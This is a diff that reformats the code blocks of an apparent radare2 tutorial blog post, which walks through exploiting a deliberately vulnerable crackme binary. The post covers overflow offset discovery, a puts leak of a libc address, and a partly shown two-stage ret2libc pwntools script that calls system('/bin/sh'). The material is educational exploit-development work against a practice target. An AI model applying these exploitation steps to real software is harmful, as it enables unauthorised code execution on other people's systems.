@@ -37,9 +37,12 @@ It&#8217;s really important to be familiar with these topics because I won&#8217
 
 First of all, let&#8217;s update radare2 to its newest git version:
 
-<pre class="toolbar:2 nums:false lang:sh decode:true" title="Installing radare2">$ git clone https://github.com/radare/radare2.git # clone radare2 if you didn't do it yet for some reason.
+```sh
+$ git clone https://github.com/radare/radare2.git # clone radare2 if you didn't do it yet for some reason.
 $ cd radare2
-$ ./sys/install.sh</pre>
+$ ./sys/install.sh
+```
+
 
 We have a long journey ahead so while we&#8217;re waiting for the update to finish, let&#8217;s get some motivation boost &#8212; cute cats video!
 
@@ -51,7 +54,10 @@ We have a long journey ahead so while we&#8217;re waiting for the update to fini
 You can download the binary from [here][9], and the source from [here][10].  
 If you want to compile the source by yourself, use the following command:
 
-<pre class="toolbar:2 toolbar-hide:false marking:false ranges:false nums:false nums-toggle:false wrap-toggle:false lang:default decode:true ">$ gcc -m32  -fno-stack-protector -no-pie megabeets_0x2.c -o megabeets_0x2</pre>
+```default
+$ gcc -m32  -fno-stack-protector -no-pie megabeets_0x2.c -o megabeets_0x2
+```
+
 
 Our binary this time is quite similar to the one from the previous post with a few slight changes to the `main()` function:
 
@@ -62,7 +68,8 @@ Our binary this time is quite similar to the one from the previous post with a f
 
 This was the previous `main()`:
 
-<pre class="toolbar:2 marking:false nums:false nums-toggle:false wrap-toggle:false lang:c decode:true" title="Previous binary">int main(int argc, char *argv[])
+```c
+int main(int argc, char *argv[])
 {
     printf("\n  .:: Megabeets ::.\n");
     printf("Think you can make it?\n");
@@ -74,11 +81,14 @@ This was the previous `main()`:
         printf("Nop, Wrong argument.\n\n");
 
     return 0;
-}</pre>
+}
+```
+
 
 And now `main` looks like this:
 
-<pre class="toolbar:2 marking:false ranges:false nums:false nums-toggle:false lang:c decode:true">int main(int argc, char *argv[])
+```c
+int main(int argc, char *argv[])
 {
     char *input; 
     puts("\n  .:: Megabeets ::.\n");
@@ -94,11 +104,14 @@ And now `main` looks like this:
 
     return 0;
 }
-</pre>
+
+```
+
 
 The functionality of the binary is pretty simple and we went through it in the previous post &#8212; It asks for user input, performs `rot13` on the input and compares it with the result of `rot13` on the string &#8220;Megabeets&#8221;. Id est, the input should be &#8216;Zrtnorrgf&#8217;.
 
-<pre class="toolbar:2 show-lang:2 nums:false nums-toggle:false lang:myshell decode:true">$ ./megabeets_0x2 
+```myshell
+$ ./megabeets_0x2 
 
   .:: Megabeets ::.
 
@@ -114,7 +127,9 @@ Show me what you got:
 Zrtnorrgf
 Success!
 
-</pre>
+
+```
+
 
 It&#8217;s all well and good but today our post is not about cracking a simple Crackme but about exploiting it. Wooho! Let&#8217;s get to the work.
 
@@ -134,7 +149,8 @@ It&#8217;s all well and good but today our post is not about cracking a simple C
 
 As with every exploitation challenge, it is always a good habit to check the binary for implemented security protections. We can do it with `rabin2` which I demonstrated in the last post or simply by executing `i` from inside radare&#8217;s shell. Because we haven&#8217;t opened the binary with radare yet, we&#8217;ll go for the `rabin2` method:
 
-<pre class="toolbar:2 toolbar-hide:false show-title:false show-lang:2 nums:false nums-toggle:false lang:batch mark:3,7,19,22,24 decode:true">$ rabin2 -I megabeets_0x2
+```batch
+$ rabin2 -I megabeets_0x2
 
 arch     x86
 binsz    6072
@@ -163,7 +179,9 @@ static   false
 stripped false
 subsys   linux
 va       true
-</pre>
+
+```
+
 
 As you can see in the marked lines, the binary is `NX` protected which means that we won&#8217;t have an executable stack to rely on. Moreover, the file isn&#8217;t protected with [`canaries`][11] , [`pic`][12]  or [`relro`][13].
 
@@ -222,7 +240,8 @@ Now that we have found the vulnerable function, we need to gently craft a payloa
 
 We&#8217;ll use a tool in radare&#8217;s framework called `ragg2`, which allows us to generate a cyclic pattern called [De Bruijn Sequence][18] and check the exact offset where our payload overrides the buffer.
 
-<pre class="toolbar:2 nums:false nums-toggle:false lang:default decode:true">$ ragg2 -
+```default
+$ ragg2 -
 &lt;truncated&gt;
  -P [size]       prepend debruijn pattern
 &lt;truncated&gt;
@@ -230,7 +249,9 @@ We&#8217;ll use a tool in radare&#8217;s framework called `ragg2`, which allows 
 &lt;truncated&gt;
 
 $ ragg2 -P 100 -r
-AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh</pre>
+AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
+```
+
 
 We know that our binary is taking user input via `stdin`, instead of copy-pate our input to the shell, we&#8217;ll use one more tool from radare&#8217;s toolset called `rarun2.`
 
@@ -364,14 +385,17 @@ Now let&#8217;s have a look at the imported functions by executing `ii` which s
           </div>
           
           <div style="overflow-x: auto; margin: 0 0 20px;">
-            <pre class="width-set:true width:160 left-set:true right-set:true toolbar:2 show-lang:2 marking:false ranges:false nums:false nums-toggle:false wrap-toggle:false show-plain:3 lang:diff decode:true">+---------------------+
+            ```diff
++---------------------+
 |       Stage 1       |
 +---------------------+
 | padding (140 bytes) |
 | puts@plt            |
 | entry_point         |
 | puts@got            |
-+---------------------+</pre>
++---------------------+
+```
+
             
             <p>
               For writing the exploit we will use <em><a href="https://github.com/Gallopsled/pwntools">pwnlib</a> </em>framework which is my favorite python framework for exploitation task. It is simplifying a lot of stuff and making our life easier. You can use every other method you prefer.
@@ -381,8 +405,11 @@ Now let&#8217;s have a look at the imported functions by executing `ii` which s
               To install <em>pwntools</em> use <code>pip</code>:
             </p>
             
-            <pre class="toolbar:2 marking:false ranges:false nums:false nums-toggle:false wrap-toggle:false show-plain:3 lang:sh decode:true">$ pip install --upgrade pip
-$ pip install --upgrade pwntools</pre>
+            ```sh
+$ pip install --upgrade pip
+$ pip install --upgrade pwntools
+```
+
             
             <p>
               You can read more about <em>pwntools</em> in the <a href="http://docs.pwntools.com/en/stable/index.html">official documentation</a>.
@@ -392,7 +419,8 @@ $ pip install --upgrade pwntools</pre>
               Here&#8217;s our python skeleton for the first stage:
             </p>
             
-            <pre class="toolbar:2 marking:false ranges:false nums:false nums-toggle:false show-plain:3 lang:python decode:true">from pwn import *
+            ```python
+from pwn import *
 
 # Addresses
 puts_plt =
@@ -429,7 +457,9 @@ def main():
 if __name__ == "__main__":
     main()
 
-</pre>
+
+```
+
             
             <p>
               We need to fill in the addresses of <code>puts@plt</code>, <code>puts@got</code>, and the entry point of the program. Let&#8217;s get back to radare2 and execute the following commands. The <code>#</code> character is used for commenting and the <code>~</code> character is radare&#8217;s internal <code>grep</code>.
@@ -453,7 +483,8 @@ if __name__ == "__main__":
               Now we need to fill in the addresses that we&#8217;ve found:
             </p>
             
-            <pre class="toolbar:2 marking:false ranges:false nums:false nums-toggle:false show-plain:3 lang:python decode:true">...
+            ```python
+...
 
 # Addresses
 puts_plt = 0x8048390
@@ -461,7 +492,9 @@ puts_got = 0x804a014
 entry_point = 0x80483d0
 
 ...
-</pre>
+
+```
+
           </div>
           
           <p>
@@ -486,7 +519,8 @@ entry_point = 0x80483d0
             Our skeleton now should look like this:
           </p>
           
-          <pre class="toolbar:2 marking:false ranges:false nums:false nums-toggle:false show-plain:3 lang:python decode:true">from pwn import *
+          ```python
+from pwn import *
 
 # Addresses
 puts_plt = 0x8048390
@@ -543,7 +577,9 @@ def main():
     log.info("exit: 0x%x" % exit_addr)
 
 if __name__ == "__main__":
-    main()</pre>
+    main()
+```
+
           
           <h3>
             <span class="ez-toc-section" id="Calculating_the_real_addresses"></span>Calculating the real addresses<span class="ez-toc-section-end"></span>
@@ -657,7 +693,8 @@ if __name__ == "__main__":
                         We found that the offset of <code>"/bin/sh"</code> from the base of <em>libc</em> is 0x167768. Let&#8217;s fill it in our exploit and move to the last part.
                       </p>
                       
-                      <pre class="toolbar:2 marking:false ranges:false nums:false nums-toggle:false show-plain:3 lang:python decode:true">...
+                      ```python
+...
 
 # Offsets
 offset_puts = 0x00062710 
@@ -665,7 +702,9 @@ offset_system = 0x0003c060
 offset_exit = 0x0002f1b0
 offset_str_bin_sh = 0x167768  
 
-...</pre>
+...
+```
+
                     </div>
                     
                     <h3>
@@ -676,14 +715,17 @@ offset_str_bin_sh = 0x167768
                       The second stage of the exploit is pretty straightforward. We will again use 140 bytes of padding, then we&#8217;ll call <code>system</code> with the address of <code>"/bin/sh"</code> as a parameter and then return to <code>exit</code>.
                     </p>
                     
-                    <pre class="width-set:true width:160 left-set:true right-set:true toolbar:2 toolbar-hide:false toolbar-delay:false show-title:false show-lang:2 marking:false ranges:false nums:false nums-toggle:false wrap-toggle:false show-plain:3 lang:diff decode:true">+---------------------+
+                    ```diff
++---------------------+
 |       Stage 2       |
 +---------------------+
 | padding (140 bytes) |
 | system@libc         |
 | exit@libc           |
 | /bin/sh address     |
-+---------------------+</pre>
++---------------------+
+```
+
                     
                     <p>
                       Remember that we returned to the entrypoint last time? That means that <code>scanf</code> is waiting for our input again. Now all we need to do is to chain these calls and send it to the program.
@@ -693,7 +735,8 @@ offset_str_bin_sh = 0x167768
                       Here&#8217;s the final script. As I mentioned earlier, you need to replace the offsets to match your version of <em>libc.</em>
                     </p>
                     
-                    <pre class="toolbar:2 marking:false ranges:false nums:false nums-toggle:false wrap-toggle:false show-plain:3 lang:python decode:true">from pwn import *
+                    ```python
+from pwn import *
 
 # Addresses
 puts_plt = 0x8048390
@@ -765,7 +808,9 @@ def main():
 
 if __name__ == "__main__":
     main()
-</pre>
+
+```
+
                     
                     <p>
                       When running this exploit we will successfully spawn a shell:
